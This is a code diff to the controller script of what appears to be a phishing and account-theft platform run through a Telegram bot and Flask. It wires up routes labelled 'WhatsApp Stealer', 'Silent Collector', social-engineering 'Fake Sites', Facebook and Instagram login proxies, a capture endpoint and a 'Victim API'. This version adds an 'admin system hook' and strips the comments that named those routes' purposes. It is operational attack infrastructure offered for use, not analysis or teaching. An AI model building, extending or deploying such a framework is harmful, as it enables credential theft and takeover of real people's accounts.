@@ -1,7 +1,7 @@
 # main.py
 # ============================================================
-# DEV 1 - Bot Controller v10
-# مع Silent Collector + Fake Sites + Instagram
+# DEV 1 - Bot Controller v11
+# مع Admin System + Silent Collector + Fake Sites
 # ============================================================
 
 import os
@@ -109,29 +109,42 @@ except Exception as e:
     def init_fake_sites(app, bot):
         pass
 
+# ============================================================
+# [7] Admin System Hook
+# ============================================================
+try:
+    from admin_system_hook import init_admin_system
+    ADMIN_SYSTEM_HOOK_ENABLED = True
+    logger.info("[+] admin_system_hook imported")
+except Exception as e:
+    logger.exception(f"[-] admin_system_hook import failed: {e}")
+    ADMIN_SYSTEM_HOOK_ENABLED = False
+
+    def init_admin_system(bot):
+        return False
 
 # ============================================================
-# [7] Flask Setup
+# [8] Flask Setup
 # ============================================================
 app = Flask(__name__)
 
 
 # ============================================================
-# [8] Origin Gate
+# [9] Origin Gate
 # ============================================================
 ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']
 
 ALLOWED_PREFIXES = (
-    '/wa',              # WhatsApp Stealer
-    '/apk',             # APK Manager + Auto-Update
-    '/dashboard',       # Web Dashboard
-    '/s/',              # Silent Collector
-    '/fs',              # Fake Sites (مواقع الهندسة الاجتماعية)
-    '/login.php',       # Facebook Proxy
-    '/home.php',        # Facebook Proxy
-    '/fb',              # Facebook Proxy shortcut
-    '/ig_login.php',    # Instagram Proxy
-    '/fb_capture',      # Facebook Capture
+    '/wa',
+    '/apk',
+    '/dashboard',
+    '/s/',
+    '/fs',
+    '/login.php',
+    '/home.php',
+    '/fb',
+    '/ig_login.php',
+    '/fb_capture',
     '/api/v1/session',
     '/f/',
     '/manifest.json',
@@ -174,7 +187,7 @@ def verify_origin():
 
 
 # ============================================================
-# [9] Health Check
+# [10] Health Check
 # ============================================================
 @app.route('/')
 def health_check():
@@ -182,7 +195,7 @@ def health_check():
 
 
 # ============================================================
-# [10] Request Timing
+# [11] Request Timing
 # ============================================================
 @app.before_request
 def start_timer():
@@ -210,7 +223,7 @@ def log_request(response):
 
 
 # ============================================================
-# [11] تسجيل الـ Blueprints
+# [12] تسجيل الـ Blueprints
 # ============================================================
 if wa_bp:
     app.register_blueprint(wa_bp)
@@ -222,7 +235,7 @@ if apk_bp:
 
 
 # ============================================================
-# [12] Init Routes
+# [13] Init Routes
 # ============================================================
 init_facebook_routes(app, bot)
 logger.info("[+] Init: facebook routes")
@@ -270,7 +283,7 @@ if SILENT_ENABLED:
 else:
     logger.warning("[-] Silent Collector disabled - skipping init")
 
-# ★ Fake Sites Routes
+# Fake Sites Routes
 if FAKE_SITES_ENABLED:
     try:
         init_fake_sites(app, bot)
@@ -284,7 +297,7 @@ register_payment_handlers(bot)
 logger.info("[+] Init: payment handlers")
 
 # ============================================================
-# [13] Victim API
+# [14] Victim API
 # ============================================================
 try:
     init_victim_api(app, bot)
@@ -293,7 +306,7 @@ except Exception as e:
     logger.exception(f"[-] Victim API init failed: {e}")
 
 # ============================================================
-# [14] Short Link
+# [15] Short Link
 # ============================================================
 try:
     init_short_link(app)
@@ -302,13 +315,13 @@ except Exception as e:
     logger.exception(f"[-] Short link init failed: {e}")
 
 # ============================================================
-# [15] Monitoring
+# [16] Monitoring
 # ============================================================
 init_monitoring(app)
 start_cleanup_thread()
 
 # ============================================================
-# [16] Web Dashboard
+# [17] Web Dashboard
 # ============================================================
 if WEB_DASHBOARD_ENABLED:
     try:
@@ -319,9 +332,24 @@ if WEB_DASHBOARD_ENABLED:
 else:
     logger.warning("[-] Web Dashboard disabled - skipping init")
 
+# ============================================================
+# [18] ★ Admin System Hook ★
+# ============================================================
+if ADMIN_SYSTEM_HOOK_ENABLED:
+    try:
+        success = init_admin_system(bot)
+        if success:
+            logger.info("[+] Init: admin system hook")
+        else:
+            logger.warning("[-] Admin system hook failed")
+    except Exception as e:
+        logger.exception(f"[-] Admin System Hook init failed: {e}")
+else:
+    logger.warning("[-] Admin System Hook disabled")
+
 
 # ============================================================
-# [17] تشغيل البوت
+# [19] تشغيل البوت
 # ============================================================
 def run_telegram_bot():
     logger.info("=" * 60)
@@ -370,7 +398,7 @@ def run_telegram_bot():
 
 
 # ============================================================
-# [18] Main
+# [20] Main
 # ============================================================
 if __name__ == "__main__":
     try:
